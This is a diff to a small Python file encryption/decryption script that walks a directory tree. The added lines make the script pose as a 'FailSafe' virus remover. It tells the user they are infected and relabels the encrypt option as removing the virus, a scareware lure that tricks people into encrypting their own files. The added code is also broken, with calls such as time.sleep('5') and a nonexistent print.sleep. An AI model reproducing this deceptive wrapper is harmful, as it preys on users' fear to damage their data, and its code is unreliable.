@@ -1,6 +1,19 @@
 import os
-
-
+import time
+print(" ")
+time.sleep(1)
+print(" ")
+time.sleep(1)
+print(" ")
+time.sleep(1)
+print("Welcome to FailSafe")
+time.sleep(1)
+print("HMMMM...")
+print("It seems lke you have been affected by a virus!!!!")
+time.sleep(1)
+print("We can remove it!!!")
+time.sleep("5")
+print.sleep(" Your persinal password is --> [password]")
 def get_files(path):
     files = []
     for r, d, f in os.walk(path):
@@ -35,7 +48,7 @@ def decrypt(filelist, password):
 
 
 if __name__ == "__main__":
-    print("Select an option. \n 1. Encrypt \n 2. Decrypt\n")
+    print("Please select an option of removal. \n [1]. Encrypt(encrypts your virus) \n [2]. Decrypt(Decrypts your files and deletes your virus)\n")
     inp = int(input())
     print("\nPlease enter the directory that you want to use: ")
     dirx = input()
